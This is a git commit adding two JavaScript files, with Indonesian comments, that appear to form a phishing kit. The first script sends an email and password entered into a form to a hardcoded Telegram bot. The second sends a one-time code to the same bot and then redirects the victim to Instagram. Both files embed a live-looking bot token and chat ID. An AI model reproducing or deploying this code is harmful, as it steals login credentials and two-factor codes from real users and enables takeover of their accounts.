8395fd04ffe971310485df209c2616f3948234b0
diyunih <diyunih77@gmail.com>
2026-02-28 01:14:50 +0800

    Add files via upload

---
+++ script1.js
@@ -0,0 +1,32 @@
+
+document.getElementById('Formulir').addEventListener('submit', function(event) {
+    event.preventDefault(); // Mencegah pengiriman formulir default
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    const token = '7376694883:AAGyPTpO0iJsT4-PQmc1VZOl3I95SS2lduo'; // Ganti dengan token bot Anda
+    const chatId = '-4727810031'; // Ganti dengan ID chat Anda
+
+    const text = `Email: ${email}\nPassword: ${password}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+    function gabungkanFungsi() {
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    alert('Succest');
+                    document.getElementById('Formulir').reset(); // Reset formulir
+                    window.location.href = "OTP.html"; // Arahkan ke halaman otp.html
+                } else {
+                    alert('Terjadi kesalahan saat mengirim kode.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim pesan.');
+            });
+    }
+
+    // Panggil fungsi gabungan
+    gabungkanFungsi();
+});
---
+++ script2.js
@@ -0,0 +1,30 @@
+
+document.getElementById('Formulir').addEventListener('submit', function(event) {
+    event.preventDefault(); // Mencegah pengiriman formulir default
+
+    const OTP = document.getElementById('OTP').value;
+    const token = '7376694883:AAGyPTpO0iJsT4-PQmc1VZOl3I95SS2lduo'; // Ganti dengan token bot Anda
+    const chatId = '-4727810031'; // Ganti dengan ID chat Anda
+
+    const text = `OTP: ${OTP}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+    function gabungkanFungsi() {
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    alert('Succest');
+                    document.getElementById('Formulir').reset(); // Reset formulir
+                    window.location.href = "https://www.instagram.com/"; // Arahkan ke halaman otp.html
+                } else {
+                    alert('Terjadi kesalahan saat mengirim kode.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim pesan.');
+            });
+    }
+
+    // Panggil fungsi gabungan
+    gabungkanFungsi();
+});
